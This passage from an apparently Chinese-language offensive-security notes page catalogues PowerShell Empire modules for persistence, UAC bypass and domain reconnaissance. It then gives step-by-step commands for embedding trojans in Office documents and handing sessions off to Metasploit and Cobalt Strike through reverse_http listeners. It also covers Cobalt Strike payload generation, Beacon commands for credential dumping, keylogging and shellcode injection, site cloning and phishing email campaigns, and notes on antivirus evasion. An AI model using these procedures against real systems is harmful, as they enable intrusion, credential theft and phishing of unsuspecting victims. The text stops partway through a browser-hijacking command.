或者脚本</td>\n</tr>\n<tr>\n<td>persistence/elevated/schtasks*</td>\n<td>计划任务持久化</td>\n</tr>\n<tr>\n<td>persistence/elevated/wmi*</td>\n<td>WMI 事件订阅持久化</td>\n</tr>\n<tr>\n<td>persistence/elevated/wmi_updater*</td>\n<td>WMI 订阅持久化</td>\n</tr>\n<tr>\n<td>persistence/misc/add_netuser</td>\n<td>将域用户或本地用户添加到当前（或远程）计算机</td>\n</tr>\n<tr>\n<td>persistence/misc/add_sid_history*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以执行 misc::addsid 以添加用户的 sid 历史记录。 仅适用于域控制器</td>\n</tr>\n<tr>\n<td>persistence/misc/debugger*</td>\n<td>将指定目标二进制文件的调试器设置为 cmd.exe</td>\n</tr>\n<tr>\n<td>persistence/misc/disable_machine_acct_change*</td>\n<td>禁止目标系统的机器帐户自动更改其密码</td>\n</tr>\n<tr>\n<td>persistence/misc/get_ssps</td>\n<td>枚举所有已加载的安全软件包</td>\n</tr>\n<tr>\n<td>persistence/misc/install_ssp*</td>\n<td>安装安全支持提供程序 dll</td>\n</tr>\n<tr>\n<td>persistence/misc/memssp*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数以执行 misc::memssp，将所有身份验证事件记录到 C:\\Windows\\System32\\mimisla.log</td>\n</tr>\n<tr>\n<td>persistence/misc/skeleton_key*</td>\n<td>运行 PowerSploit 的 Invoke-Mimikatz 函数来执行 misc::skeleton，植入密码 mimikatz 的万能钥匙。 仅适用于域控制器</td>\n</tr>\n<tr>\n<td>persistence/powerbreach/deaduser</td>\n<td>DeadUserBackdoor 后门，详细信息：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zaXhkdWIubmV0Lz9wPTUzNQ==\">http://www.sixdub.net/?p=535</span></td>\n</tr>\n<tr>\n<td>persistence/powerbreach/eventlog*</td>\n<td>启动事件循环后门</td>\n</tr>\n<tr>\n<td>persistence/powerbreach/resolver</td>\n<td>启动解析器后门</td>\n</tr>\n<tr>\n<td>persistence/userland/backdoor_lnk</td>\n<td>LNK 文件后门</td>\n</tr>\n<tr>\n<td>persistence/userland/registry</td>\n<td>计算机启动项持久化，通过 HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 进行持久化，运行一个 stager 或者脚本</td>\n</tr>\n<tr>\n<td>persistence/userland/schtasks</td>\n<td>计划任务持久化</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-390\"><a class=\"anchor\" href=\"#-390\">#</a> </h2>\n<h2 id=\"privesc权限提升\"><a class=\"anchor\" href=\"#privesc权限提升\">#</a> Privesc（权限提升）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>privesc/ask</td>\n<td>弹出一个对话框，询问用户是否要以管理员身份运行 powershell</td>\n</tr>\n<tr>\n<td>privesc/bypassuac</td>\n<td>UAC bypass</td>\n</tr>\n<tr>\n<td>privesc/bypassuac_env</td>\n<td>UAC bypass</td>\n</tr>\n<tr>\n<td>privesc/bypassuac_eventvwr</td>\n<td>UAC bypass</td>\n</tr>\n<tr>\n<td>privesc/bypassuac_fodhelper</td>\n<td>UAC bypass</td>\n</tr>\n<tr>\n<td>privesc/bypassuac_sdctlbypass</td>\n<td>UAC bypass</td>\n</tr>\n<tr>\n<td>privesc/bypassuac_tokenmanipulation</td>\n<td>UAC bypass</td>\n</tr>\n<tr>\n<td>privesc/bypassuac_wscript</td>\n<td>UAC bypass</td>\n</tr>\n<tr>\n<td>privesc/getsystem*</td>\n<td>获取 system 特权</td>\n</tr>\n<tr>\n<td>privesc/gpp</td>\n<td>利用 windows 组策略首选项缺陷获取系统帐号</td>\n</tr>\n<tr>\n<td>privesc/mcafee_sitelist</td>\n<td>寻找 McAfee SiteList.xml 文件的纯文本密码</td>\n</tr>\n<tr>\n<td>privesc/ms16-032</td>\n<td>MS16-032 本地提权</td>\n</tr>\n<tr>\n<td>privesc/ms16-135</td>\n<td>MS16-135 本地提权</td>\n</tr>\n<tr>\n<td>privesc/tater</td>\n<td>利用 PowerShell 实现的 Hot Potato 提权</td>\n</tr>\n<tr>\n<td>privesc/powerup/allchecks</td>\n<td>检查目标主机的攻击向量以进行权限提升</td>\n</tr>\n<tr>\n<td>privesc/powerup/find_dllhijack</td>\n<td>查找通用的.DLL 劫持</td>\n</tr>\n<tr>\n<td>privesc/powerup/service_exe_restore</td>\n<td>还原备份的服务二进制文件</td>\n</tr>\n<tr>\n<td>privesc/powerup/service_exe_stager</td>\n<td>备份服务的二进制文件，并用启动 stager.bat 的二进制文件替换原始文件</td>\n</tr>\n<tr>\n<td>privesc/powerup/service_exe_useradd</td>\n<td>修改目标服务以创建本地用户并将其添加到本地管理员</td>\n</tr>\n<tr>\n<td>privesc/powerup/service_stager</td>\n<td>修改目标服务以执行 Empire stager</td>\n</tr>\n<tr>\n<td>privesc/powerup/service_useradd</td>\n<td>修改目标服务以创建本地用户并将其添加到本地管理员</td>\n</tr>\n<tr>\n<td>privesc/powerup/write_dllhijacker</td>\n<td>将可劫持的.dll 以及.dll 调用的 stager.bat 一起写到指定路径。 wlbsctrl.dll 在 Windows 7 上运行良好。需要重新启动计算机</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-391\"><a class=\"anchor\" href=\"#-391\">#</a> </h2>\n<h2 id=\"recon侦察\"><a class=\"anchor\" href=\"#recon侦察\">#</a> Recon（侦察）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>recon/find_fruit</td>\n<td>在网络范围内搜索潜在的易受攻击的 Web 服务</td>\n</tr>\n<tr>\n<td>recon/get_sql_server_login_default_pw</td>\n<td>发现在当前广播域之内的 SQL Server 实例</td>\n</tr>\n<tr>\n<td>recon/http_login</td>\n<td>针对基本身份验证测试凭据</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-392\"><a class=\"anchor\" href=\"#-392\">#</a> </h2>\n<h2 id=\"situational_awareness态势感知\"><a class=\"anchor\" href=\"#situational_awareness态势感知\">#</a> Situational_awareness（态势感知）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>situational_awareness/host/antivirusproduct</td>\n<td>获取防病毒产品信息</td>\n</tr>\n<tr>\n<td>situational_awareness/host/computerdetails*</td>\n<td>枚举有关系统的有用信息</td>\n</tr>\n<tr>\n<td>situational_awareness/host/dnsserver</td>\n<td>枚举系统使用的 DNS 服务器</td>\n</tr>\n<tr>\n<td>situational_awareness/host/findtrusteddocuments</td>\n<td>该模块将枚举适当的注册表</td>\n</tr>\n<tr>\n<td>situational_awareness/host/get_pathacl</td>\n<td>枚举给定文件路径的 ACL</td>\n</tr>\n<tr>\n<td>situational_awareness/host/get_proxy</td>\n<td>枚举当前用户的代理服务器和 WPAD 内容</td>\n</tr>\n<tr>\n<td>situational_awareness/host/get_uaclevel</td>\n<td>枚举 UAC 级别</td>\n</tr>\n<tr>\n<td>situational_awareness/host/monitortcpconnections</td>\n<td>监视主机与指定域名或 IPv4 地址的 TCP 连接，对于会话劫持和查找与敏感服务进行交互的用户很有用</td>\n</tr>\n<tr>\n<td>situational_awareness/host/paranoia*</td>\n<td>持续检查运行过程中是否存在可疑用户</td>\n</tr>\n<tr>\n<td>situational_awareness/host/winenum</td>\n<td>收集有关主机和当前用户上下文的相关信息</td>\n</tr>\n<tr>\n<td>situational_awareness/network/arpscan</td>\n<td>针对给定范围的 IPv4 IP 地址执行 ARP 扫描</td>\n</tr>\n<tr>\n<td>situational_awareness/network/bloodhound</td>\n<td>执行 BloodHound 数据收集</td>\n</tr>\n<tr>\n<td>situational_awareness/network/get_exploitable_system</td>\n<td>查询 Active Directory 以查找可能容易受到 Metasploit Exploit 的系统</td>\n</tr>\n<tr>\n<td>situational_awareness/network/get_spn</td>\n<td>获取服务主体名称（SPN）</td>\n</tr>\n<tr>\n<td>situational_awareness/network/get_sql_instance_domain</td>\n<td>返回 SQL Server 实例列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/get_sql_server_info</td>\n<td>从目标 SQL Server 返回基本服务器和用户信息</td>\n</tr>\n<tr>\n<td>situational_awareness/network/portscan</td>\n<td>使用常规套接字进行简单的端口扫描</td>\n</tr>\n<tr>\n<td>situational_awareness/network/reverse_dns</td>\n<td>执行给定 IPv4 IP 范围的 DNS 反向查找</td>\n</tr>\n<tr>\n<td>situational_awareness/network/smbautobrute</td>\n<td>针对用户名 / 密码列表运行 SMB 暴力破解</td>\n</tr>\n<tr>\n<td>situational_awareness/network/smbscanner</td>\n<td>在多台机器上测试用户名 / 密码组合</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/find_foreign_group</td>\n<td>枚举给定域的组的所有成员，并查找不在查询域中的用户</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/find_foreign_user</td>\n<td>枚举在其主域之外的组中的用户</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/find_gpo_computer_admin</td>\n<td>获取计算机（或 GPO）对象，并确定哪些用户 / 组对该对象具有管理访问权限</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/find_gpo_location</td>\n<td>获取用户名或组名，并确定其具有通过 GPO 进行管理访问的计算机</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/find_localadmin_access</td>\n<td>在当前用户具有 “本地管理员” 访问权限的本地域上查找计算机</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/find_managed_security_group</td>\n<td>此功能检索域中的所有安全组</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_cached_rdpconnection</td>\n<td>使用远程注册表功能来查询计算机上 “Windows 远程桌面连接客户端” 的所有信息</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_computer</td>\n<td>查询当前计算机对象的域</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_dfs_share</td>\n<td>返回给定域的所有容错分布式文件系统的列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_domain_controller</td>\n<td>返回当前域或指定域的域控制器</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_domain_policy</td>\n<td>返回给定域或域控制器的默认域或 DC 策略</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_domain_trust</td>\n<td>返回当前域或指定域的所有域信任</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_fileserver</td>\n<td>返回从用户主目录提取的所有文件服务器的列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_forest</td>\n<td>返回有关给定域森林的信息</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_forest_domain</td>\n<td>返回给定林的所有域</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_gpo</td>\n<td>获取域中所有当前 GPO 的列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_group</td>\n<td>获取域中所有当前组的列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_group_member</td>\n<td>返回给定组的成员</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_localgroup</td>\n<td>返回本地或远程计算机上指定本地组中所有当前用户的列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_loggedon</td>\n<td>执行 NetWkstaUserEnum Win32API 调用以查询主动登录主机的用户</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_object_acl</td>\n<td>返回与特定活动目录对象关联的 ACL</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_ou</td>\n<td>获取域中所有当前 OU 的列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_rdp_session</td>\n<td>在给定的 RDP 远程服务中查询活动会话和原始 IP</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_session</td>\n<td>执行 NetSessionEnum Win32API 调用以查询主机上的活动会话</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_site</td>\n<td>获取域中所有当前站点的列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_subnet</td>\n<td>获取域中所有当前子网的列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/get_user</td>\n<td>查询给定用户或指定域中用户的信息</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/map_domain_trust</td>\n<td>使用.CSV 输出映射所有可访问的域信任</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/process_hunter</td>\n<td>查询远程机器的进程列表</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/set_ad_object</td>\n<td>使用 SID，名称或 SamAccountName 来查询指定的域对象</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/share_finder</td>\n<td>在域中的计算机上查找共享</td>\n</tr>\n<tr>\n<td>situational_awareness/network/powerview/user_hunter</td>\n<td>查找指定组的用户登录的机器</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-393\"><a class=\"anchor\" href=\"#-393\">#</a> </h2>\n<h2 id=\"trollsploit恶作剧\"><a class=\"anchor\" href=\"#trollsploit恶作剧\">#</a> Trollsploit（恶作剧）</h2>\n<table>\n<thead>\n<tr>\n<th>模块名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>trollsploit/get_schwifty</td>\n<td>播放 Schwifty 视频，同时把计算机音量设置最大</td>\n</tr>\n<tr>\n<td>trollsploit/message</td>\n<td>发送一个消息框</td>\n</tr>\n<tr>\n<td>trollsploit/process_killer</td>\n<td>终止以特定名称开头的任何进程</td>\n</tr>\n<tr>\n<td>trollsploit/rick_ascii</td>\n<td>生成一个新的 powershell.exe 进程运行 Lee Holmes' ASCII Rick Roll</td>\n</tr>\n<tr>\n<td>trollsploit/rick_astley</td>\n<td>运行 SadProcessor's beeping rickroll</td>\n</tr>\n<tr>\n<td>trollsploit/thunderstruck</td>\n<td>播放 Thunderstruck 视频，同时把计算机音量设置最大</td>\n</tr>\n<tr>\n<td>trollsploit/voicetroll</td>\n<td>通过目标上的合成语音朗读文本</td>\n</tr>\n<tr>\n<td>trollsploit/wallpaper</td>\n<td>将.jpg 图片上传到目标机器并将其设置为桌面壁纸</td>\n</tr>\n<tr>\n<td>trollsploit/wlmdr</td>\n<td>在任务栏中显示气球提示</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-394\"><a class=\"anchor\" href=\"#-394\">#</a> </h2>\n<h2 id=\"empire-word\"><a class=\"anchor\" href=\"#empire-word\">#</a> Empire Word</h2>\n<pre><code>&gt;usestager windows/launcher_bat生成bat木马，设置Listener\nWord/Excel-&gt;插入-&gt;对象-&gt;由文件创建，选择bat，显示为图标，修改图标\nMacro\n&gt;usestager windows/macro 设置Listener\nWord/Excel-&gt;试图-&gt;宏-&gt;创建，复制macro进去\n</code></pre>\n<h2 id=\"-395\"><a class=\"anchor\" href=\"#-395\">#</a> </h2>\n<h2 id=\"empire派生cobalt-strike和msf\"><a class=\"anchor\" href=\"#empire派生cobalt-strike和msf\">#</a> Empire 派生 Cobalt Strike 和 MSF</h2>\n<h2 id=\"-396\"><a class=\"anchor\" href=\"#-396\">#</a> </h2>\n<h3 id=\"派生msf\"><a class=\"anchor\" href=\"#派生msf\">#</a> 派生 MSF</h3>\n<pre><code>可绕过杀软\nEmpire\n&gt;usemodule code_execution/invoke_shellcode\n&gt;set Lhost 192.168.0.1\n&gt;set Lport 4444\n&gt;set Payload reverse_http\nMSF\n&gt;use exploit/multi/handler\n&gt;set payloadwindows/meterpreter/reverse_http\n&gt;set Lhost 192.168.31.247\n&gt;set lport 4444\n&gt;run\n或Empire\n&gt;usemodule code_execution/invoke_metasploitpayload\n&gt;set URL http://SRVHOST:SRVPORT\nMSF\n#use exploit/multi/script/web_delivery\n#set payload windows/x64/meterpreter/reverse_tcp\n设置SRVHOST SRVPORT\n</code></pre>\n<h2 id=\"-397\"><a class=\"anchor\" href=\"#-397\">#</a> </h2>\n<h3 id=\"派生cobalt-strike-2\"><a class=\"anchor\" href=\"#派生cobalt-strike-2\">#</a> 派生 Cobalt Strike</h3>\n<pre><code>创建监听器/windows/beacon_http/reverse_http 设置端口和主机\nEmpire\n&gt;usemodule code_execution/invoke_shellcode\n&gt;set Lhost 192.168.0.1\n&gt;set Lport 4444\n&gt;set Payload reverse_http\n</code></pre>\n<h3 id=\"cobalt-strike-2\"><a class=\"anchor\" href=\"#cobalt-strike-2\">#</a> Cobalt Strike</h3>\n<h2 id=\"-398\"><a class=\"anchor\" href=\"#-398\">#</a> </h2>\n<h2 id=\"安装-2\"><a class=\"anchor\" href=\"#安装-2\">#</a> 安装</h2>\n<pre><code>需要JDK环境\n&gt;tar -xzvf jdk-8u191-linux-x64.tar.gz\n</code></pre>\n<h2 id=\"-399\"><a class=\"anchor\" href=\"#-399\">#</a> </h2>\n<h2 id=\"部署teamserver\"><a class=\"anchor\" href=\"#部署teamserver\">#</a> 部署 TeamServer</h2>\n<pre><code>&gt;./teamserver 192.168.0.107 123456\n格式是外网IP和密码\n</code></pre>\n<h2 id=\"-400\"><a class=\"anchor\" href=\"#-400\">#</a> </h2>\n<h2 id=\"模块-2\"><a class=\"anchor\" href=\"#模块-2\">#</a> 模块</h2>\n<pre><code>New Connection：新建连接\nPreferences：设置外观\nVisualization：查看主机的不同形式\nVPN Interfaces： VPN接口\nListeners：监听器\nScript Interfaces：查看和加载CNA脚本\nClose：关闭CS\n</code></pre>\n<h2 id=\"-401\"><a class=\"anchor\" href=\"#-401\">#</a> </h2>\n<h2 id=\"连接\"><a class=\"anchor\" href=\"#连接\">#</a> 连接</h2>\n<p><img data-src=\"212.png\" alt=\"\" /></p>\n<h2 id=\"-402\"><a class=\"anchor\" href=\"#-402\">#</a> </h2>\n<h2 id=\"监听器\"><a class=\"anchor\" href=\"#监听器\">#</a> 监听器</h2>\n<pre><code>创建\nCobalt Strike -&gt; Listeners点击Add\n</code></pre>\n<p><img data-src=\"213.png\" alt=\"\" /></p>\n<pre><code>Beacon为CS内部监听器。\nForeign一般与MSF结合使用。\n系统架构的支持\n</code></pre>\n<p><img data-src=\"214.png\" alt=\"\" /></p>\n<h2 id=\"-403\"><a class=\"anchor\" href=\"#-403\">#</a> </h2>\n<h2 id=\"攻击模块\"><a class=\"anchor\" href=\"#攻击模块\">#</a> 攻击模块</h2>\n<p><img data-src=\"215.png\" alt=\"\" /></p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>HTML Application</td>\n<td>基于 powershell 的.hta 格式的 HTML Application 木马，分为可执行文件、PowerShell、VBA 三种方法</td>\n</tr>\n<tr>\n<td>MS Office Macro</td>\n<td>office 宏病毒文件</td>\n</tr>\n<tr>\n<td>Payload Generator</td>\n<td>基于 C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA 等语言的 payload</td>\n</tr>\n<tr>\n<td>USB/CD AutoPlay</td>\n<td>利用 USB/CD 自动播放运行的木马</td>\n</tr>\n<tr>\n<td>Windows Dropper</td>\n<td>捆绑器</td>\n</tr>\n<tr>\n<td>Windows Executable</td>\n<td>生成 32 位或 64 位的 exe 和基于服务的可执行文件、DLL 等后门</td>\n</tr>\n<tr>\n<td>Windows Executable(S)</td>\n<td>生成可执行文件，支持 powershell 脚本，提供代理功能</td>\n</tr>\n</tbody>\n</table>\n<pre><code>Web Drive-by基于WEB的攻击模块\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Manage</td>\n<td>管理开启的模块</td>\n</tr>\n<tr>\n<td>Clone Site</td>\n<td>克隆网站</td>\n</tr>\n<tr>\n<td>Host File</td>\n<td>提供文件下载</td>\n</tr>\n<tr>\n<td>Scripted Web Delivery</td>\n<td>基于 Web 的攻击 Payload</td>\n</tr>\n<tr>\n<td>Signed Applet Attack</td>\n<td>运行 java 自签名的攻击模块</td>\n</tr>\n<tr>\n<td>Smart Applet Attack</td>\n<td>自动检测 Java 版本并利用已知的 exploits 攻击</td>\n</tr>\n<tr>\n<td>System Profiler</td>\n<td>信息探测模块</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-404\"><a class=\"anchor\" href=\"#-404\">#</a> </h2>\n<h2 id=\"视图模块\"><a class=\"anchor\" href=\"#视图模块\">#</a> 视图模块</h2>\n<table>\n<thead>\n<tr>\n<th>Applications</th>\n<th>显示靶机应用信息</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Credentials</td>\n<td>显示密码 (hashdump 和 mimikatz 获取的)</td>\n</tr>\n<tr>\n<td>Downloads</td>\n<td>下载文件</td>\n</tr>\n<tr>\n<td>Event Log</td>\n<td>事件日志</td>\n</tr>\n<tr>\n<td>Keystrokes</td>\n<td>键盘记录</td>\n</tr>\n<tr>\n<td>Proxy Pivots</td>\n<td>代理信息</td>\n</tr>\n<tr>\n<td>Screenshots</td>\n<td>屏幕截图</td>\n</tr>\n<tr>\n<td>Script Console</td>\n<td>加载脚本</td>\n</tr>\n<tr>\n<td>Targets</td>\n<td>查看目标</td>\n</tr>\n<tr>\n<td>Web Log</td>\n<td>查看 web 日志</td>\n</tr>\n</tbody>\n</table>\n<pre><code>创建powershell脚本\n</code></pre>\n<p><img data-src=\"216.png\" alt=\"\" /><br />\n<img data-src=\"217.png\" alt=\"\" /></p>\n<pre><code>复制脚本到目标机执行即可上线.\n</code></pre>\n<p><img data-src=\"218.png\" alt=\"\" /></p>\n<h2 id=\"-405\"><a class=\"anchor\" href=\"#-405\">#</a> </h2>\n<h2 id=\"交互-2\"><a class=\"anchor\" href=\"#交互-2\">#</a> 交互</h2>\n<pre><code>右键目标机Interact进入交互模式\nAccess\t\nDump hashes\t获取密码\nElevate\t提权\nGolden Ticket\t黄金票据注入会话\nMake token\t制作令牌\nRun Mimikatz\t运行mimikatz\nSpawn As\t以靶机其他用户权限生成会话\nExplore\t\nBrowser Pivot\t劫持浏览器\nDesktop(VNC)\t远程VNC\nFile Browser\t文件管理\nNet View\t执行命令net view\nPort scan\t端口扫描\nProcess list\t进程列表\nScreenshot\t截图\nPivoting\t\t\nSOCKS Server\t代理\nListener\t已获权限的机器当作监听器(反向端口转发)\nDeploy VPN\t部署VPN\nSpawn\t\n派生会话：联动MSF或Armitage\t\n右键执行mimikatz即可获取hash及明文密码\n</code></pre>\n<p><img data-src=\"219.png\" alt=\"\" /></p>\n<pre><code>视图-&gt;凭证信息列出密码，类似empire的creds命令\n</code></pre>\n<p><img data-src=\"220.png\" alt=\"\" /></p>\n<h2 id=\"-406\"><a class=\"anchor\" href=\"#-406\">#</a> </h2>\n<h2 id=\"beacon\"><a class=\"anchor\" href=\"#beacon\">#</a> Beacon</h2>\n<pre><code>argue                     进程参数欺骗\nblockdlls                  阻止子进程加载非Microsoft DLL\nbrowserpivot              注入受害者浏览器进程\nbypassuac                绕过UAC提升权限\ncancel                    取消正在进行的下载\ncd                        切换目录\ncheckin                   强制让被控端回连一次\nclear                     清除beacon内部的任务队列\nconnect                   Connect to a Beacon peer over TCP\ncovertvpn                 部署Covert VPN客户端\ncp                        复制文件\ndcsync                    从DC中提取密码哈希\ndesktop                   远程桌面(VNC)\ndllinject                   反射DLL注入进程\ndllload                    使用LoadLibrary将DLL加载到进程中\ndownload                 下载文件\ndownloads                列出正在进行的文件下载\ndrives                     列出目标盘符\nelevate                    使用exp\nexecute                   在目标上执行程序(无输出)\nexecute-assembly         在目标上内存中执行本地.NET程序\nexit                       终止beacon会话\ngetprivs                   Enable system privileges on current token\ngetsystem                 尝试获取SYSTEM权限\ngetuid                     获取用户ID\nhashdump                  转储密码哈希值\nhelp                       帮助\ninject                      在注入进程生成会话\njobkill                     结束一个后台任务\njobs                       列出后台任务\nkerberos_ccache_use       从ccache文件中导入票据应用于此会话\nkerberos_ticket_purge     清除当前会话的票据\nkerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话\nkeylogger                 键盘记录\nkill                      结束进程\nlink                      Connect to a Beacon peer over a named pipe\nlogonpasswords            使用mimikatz转储凭据和哈希值\nls                        列出文件\nmake_token                创建令牌以传递凭据\nmimikatz                  运行mimikatz\nmkdir                     创建一个目录\nmode dns                  使用DNS A作为通信通道(仅限DNS beacon)\nmode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)\nmode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)\nmode http                 使用HTTP作为通信通道\nmv                        移动文件\nnet                       net命令\nnote                      备注       \nportscan                  进行端口扫描\npowerpick                 通过Unmanaged PowerShell执行命令\npowershell                通过powershell.exe执行命令\npowershell-import         导入powershell脚本\nppid                      Set parent PID for spawned post-ex jobs\nps                        显示进程列表\npsexec                    Use a service to spawn a session on a host\npsexec_psh                Use PowerShell to spawn a session on a host\npsinject                  在特定进程中执行PowerShell命令\npth                       使用Mimikatz进行传递哈希\npwd                       当前目录位置\nreg                       Query the registry\nrev2self                  恢复原始令牌\nrm                        删除文件或文件夹\nrportfwd                  端口转发\nrun                       在目标上执行程序(返回输出)\nrunas                     以其他用户权限执行程序\nrunasadmin                在高权限下执行程序\nrunu                      Execute a program under another PID\nscreenshot                屏幕截图\nsetenv                    设置环境变量\nshell                     执行cmd命令\nshinject                  将shellcode注入进程\nshspawn                   启动一个进程并将shellcode注入其中\nsleep                     设置睡眠延迟时间\nsocks                     启动SOCKS4代理\nsocks stop                停止SOCKS4\nspawn                     Spawn a session \nspawnas                   Spawn a session as another user\nspawnto                   Set executable to spawn processes into\nspawnu                    Spawn a session under another PID\nssh                       使用ssh连接远程主机\nssh-key                   使用密钥连接远程主机\nsteal_token               从进程中窃取令牌\ntimestomp                 将一个文件的时间戳应用到另一个文件\nunlink                    Disconnect from parent Beacon\nupload                    上传文件\nwdigest                   使用mimikatz转储明文凭据\nwinrm                     使用WinRM横向渗透\nwmi                       使用WMI横向渗透\n执行命令，在beacon模式下键入shell+命令\n</code></pre>\n<p><img data-src=\"221.png\" alt=\"\" /></p>\n<pre><code>&gt;sleep 0 交互模式，立刻执行命令\n注入DLL到某个进程\n&gt;dllload [pid] [c:\\path\\to\\file.dll] DLL需在目标上\n&gt;kerberos_ticket_purge 清除票据\n&gt;kerberos_ccache_use\t[/path/to/file.ccache]  从ccache文件导入票据\n&gt;kerberos_ticket_use [/path/to/file.ccache] 从ticket文件导入票据\n&gt;kill pid 结束进程\n&gt;timestomp [fileA]\t[fileB] 修改文件时间戳\n&gt;getuid\t 获取当前用户\n&gt;steal_token [pid] 窃取进程ID\n&gt;rev2self 恢复原始令牌\n&gt;powershell-import\t[/path/to/local/script.ps1] 导入PS模块 \n&gt;shinject [pid] &lt;x86|x64&gt; [/path/to/my.bin] 向进程注入shellcode\n&gt;socks\tport在指定端口开启代理\n&gt;socks stop停止代理\n&gt;rportfwd [bind port]\t[forward host]\t[forward port]开启端口转发\n</code></pre>\n<h2 id=\"-407\"><a class=\"anchor\" href=\"#-407\">#</a> </h2>\n<h2 id=\"克隆网站\"><a class=\"anchor\" href=\"#克隆网站\">#</a> 克隆网站</h2>\n<pre><code>Attacks -&gt; Web Drive-by -&gt; System Profiler\nRedirect url设置为目标站，登录成功会挑战到真实网站\n钓鱼攻击-&gt;克隆网站\n克隆地址写入要克隆的网站\nAttack选择刚刚收集信息的网站\nWeb日志界面可记录键盘\n</code></pre>\n<p><img data-src=\"222.png\" alt=\"\" /></p>\n<pre><code>攻击-&gt;钓鱼攻击管理-&gt;web服务管理中，可kill掉刚刚的任务\n</code></pre>\n<p><img data-src=\"223.png\" alt=\"\" /></p>\n<h2 id=\"-408\"><a class=\"anchor\" href=\"#-408\">#</a> </h2>\n<h2 id=\"office宏\"><a class=\"anchor\" href=\"#office宏\">#</a> office 宏</h2>\n<p><img data-src=\"224.png\" alt=\"\" /><br />\n<img data-src=\"225.png\" alt=\"\" /><br />\n<img data-src=\"226.png\" alt=\"\" /></p>\n<h2 id=\"-409\"><a class=\"anchor\" href=\"#-409\">#</a> </h2>\n<h2 id=\"钓鱼邮件-2\"><a class=\"anchor\" href=\"#钓鱼邮件-2\">#</a> 钓鱼邮件</h2>\n<pre><code>新克隆一个网站\n</code></pre>\n<p><img data-src=\"227.png\" alt=\"\" /></p>\n<pre><code>Embed URL选择克隆好的网站\n</code></pre>\n<p><img data-src=\"228.png\" alt=\"\" /><br />\n<img data-src=\"229.png\" alt=\"\" /><br />\n<img data-src=\"230.png\" alt=\"\" /></p>\n<pre><code>里面的超链接已经被Embed URL克隆好的URL替换掉了\n</code></pre>\n<p><img data-src=\"231.png\" alt=\"\" /><br />\n<img data-src=\"232.png\" alt=\"\" /></p>\n<pre><code>若是要加载附件，需注意附件的免杀\n</code></pre>\n<h2 id=\"-410\"><a class=\"anchor\" href=\"#-410\">#</a> </h2>\n<h2 id=\"加载脚本\"><a class=\"anchor\" href=\"#加载脚本\">#</a> 加载脚本</h2>\n<pre><code>https://github.com/rsmudge/ElevateKit 提权脚本\n&gt;git clone https://github.com/rsmudge/ElevateKit.git\n&gt;git clone https://github.com/TheKingOfDuck/myScripts.git\nCobalt Strike -&gt; Scripts 选择elevate.cna加载\n提权的EXP列表就会增加已经加入的模块\n</code></pre>\n<h2 id=\"-411\"><a class=\"anchor\" href=\"#-411\">#</a> </h2>\n<h2 id=\"浏览器劫持\"><a class=\"anchor\" href=\"#浏览器劫持\">#</a> 浏览器劫持</h2>\n<pre><code>beacon 设为交互模式\nbeacon&gt; sleep 0\n[Beacon] → Explore → Browser Pivot\n选择打对勾的注入，会返回一个proxy，服务器IP+端口\n&gt;chromium --no-sandbox 